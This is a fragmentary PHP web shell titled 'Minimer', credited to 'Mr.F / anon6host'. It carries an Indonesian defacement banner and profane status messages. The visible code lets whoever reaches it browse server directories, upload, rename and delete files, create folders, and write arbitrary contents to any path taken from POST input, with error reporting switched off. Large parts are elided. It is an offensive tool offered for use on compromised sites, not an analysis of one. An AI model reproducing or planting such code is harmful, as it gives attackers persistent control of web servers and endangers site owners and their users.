...
/*
Minimer
Author : Mr.F	/ anon6host						 
Team 	: No Team
Site		: https://anon6host.my.id
*/
error_reporting(0);
...
<html>
<head>
<title>LEK SUNARI</title>
</head>';

?>

<center><img src="https://d.top4top.net/p_118829wzx0.jpg" height="600px">
<style> 
@font-face {
...
echo '</head>
<body><b>
<H1><center><font color="red">Memberi penderitaan </font><font color="red">un</font><font color="white">tuk </font><font color="white">memahami penderitaan</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ posisi kyta : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<font color="green">Ciee berhasil>:(</font><br />';
}else{
echo '<font color="red">Sorry ya Gagal!</font><br />';
}
}
...
<input type="submit" value="skuy up" />
</form></center>
</td></tr>';
...
echo '<font color="green">Leh ugha berhasil>:( </font><br />';
}else{
echo '<font color="red">Buat apa diganti gagal juga>:( </font><br />';
}
...
echo '<font color="green">Hoki lu tod Berhasil! [ '.$new.' ]</font><br />';
}else{
...
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Ciee si anjink berhasil xD </font><br />';
}else{
echo '<font color="red">Mampus Gagal Kontol! </font><br />';
}
fclose($fp);
}
$hell = $_GET['path'];
...
echo '<font color="red#">Gagal hapus keknya karma nih>:(</font><br />';
}
}
//buat folder
if($_GET['type'] == 'buat'){
...
if(!mkdir($new)){
echo '<font color="red">Gagal Sontod!</font><br />';
}else{
echo '<font color="green">Ok kali ini berhasil>:(</font><br />';
}
}
//Delete file
...
echo '<br><center>&copy;anon6host.my.id</b>
</body> </html></body>
</html>';
function perms($file){
